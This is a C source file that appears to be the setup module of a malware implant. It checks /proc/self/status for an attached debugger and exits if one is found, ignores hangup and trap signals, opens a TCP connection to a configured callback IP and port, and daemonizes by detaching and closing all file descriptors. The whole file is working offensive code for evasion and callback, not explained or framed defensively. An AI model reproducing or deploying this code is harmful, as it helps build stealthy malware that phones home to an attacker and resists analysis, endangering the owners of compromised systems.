
#include "setup.h"
#include <asm-generic/socket.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

static bool debugger_is_attached(void)
{
    char buf[4096] = {0};

    const int status_fd = open("/proc/self/status", O_RDONLY);
    if (status_fd == -1) {
        KILL("could not open /proc/self/status");
        return false;
    }

    const ssize_t num_read = read(status_fd, buf, sizeof(buf) - 1);
    if (num_read <= 0)
        return false;

    buf[num_read] = '\0';
    const char tracer_pid[] = "TracerPid:";
    const char *tracer_pid_ptr = strstr(buf, tracer_pid);
    if (!tracer_pid_ptr)
        return false;

    const char *char_ptr = tracer_pid_ptr + sizeof(tracer_pid) -  1;
    while (++char_ptr <= buf + num_read) {
        if (isspace(*char_ptr))
            continue;
        else return isdigit(*char_ptr) != 0 && *char_ptr != '0';
    }
    return false;
}

static void setup_log(void)
{
    g_logfd = open(LOG_PATH, O_WRONLY | O_TRUNC | O_CREAT, S_IRUSR);
}

static void setup_socket(void)
{
    int flag = 1;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(atoi(CALLBACK_PORT)),
        .sin_addr.s_addr = inet_addr(CALLBACK_IP)
    };
    g_sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (!g_sockfd)
        return;
    else if (setsockopt(g_sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
        &flag, sizeof(int)) < 0)
        return;
    else if (connect(g_sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
        return;
}

void init(void)
{
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGTRAP, SIG_IGN);

    setup_log();
    setup_socket();
    if (debugger_is_attached())
        exit(1);
}

void daemonize(void)
{
    register int file_desc = sysconf(_SC_OPEN_MAX);

    if (setsid() < 0 || fork() < 0)
        exit(1);
    umask(0);
    while (file_desc-- >= 0)
        close(file_desc);
}


